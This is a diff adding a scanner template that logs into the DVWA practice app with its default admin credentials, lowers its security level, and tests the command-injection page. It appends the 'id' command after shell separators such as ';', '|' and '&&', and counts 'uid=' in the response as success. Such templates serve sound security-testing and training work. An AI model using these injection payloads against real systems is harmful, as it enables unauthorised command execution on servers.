@@ -1,0 +1,104 @@
+id: dvwa-command-injection-low-sec
+
+info:
+  name: DVWA Command Injection - low sec (Authenticated)
+  author: Shieldia
+  severity: high
+  description: Attempts to exploit command injection on DVWA after authentication.
+  reference:
+    - https://github.com/digininja/D
+  tags: dvwa,auth,command-injection
+
+variables:
+  password: "password"
+  username: "admin"
+
+  # Define payloads in variables instead of http section
+  inputs:
+    - "127.1.1.1"
+    - "asdf"
+  esc_chars:
+    - ";"
+    - "|"
+    - "||"
+    - "&&"
+  commands:
+    - "id"
+
+flow: |
+  http(1) && http(2);
+  for (let input of iterate(template["inputs"])) {
+    set("input", input);
+    for (let esc_char of iterate(template["esc_chars"])) {
+      set("esc_char", esc_char);
+      for (let command of iterate(template["commands"])) {
+        set("command", command);
+        http(3);
+      }
+    }
+  }
+
+http:
+  # Step 1: Authenticate and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+  
+  # Step 2: Set Security Level to Low
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=low&seclev_submit=Submit&user_token={{token}}
+
+  # Step 3: Execute Command Injection
+  - raw:
+      - |
+        POST /DVWA/vulnerabilities/exec/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        ip={{input}}{{url_encode(esc_char)}}{{command}}&Submit=Submit
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+    
+    extractors:
+      - type: dsl
+        name: inject command
+        dsl:
+          - "concat(input,esc_char,command)"
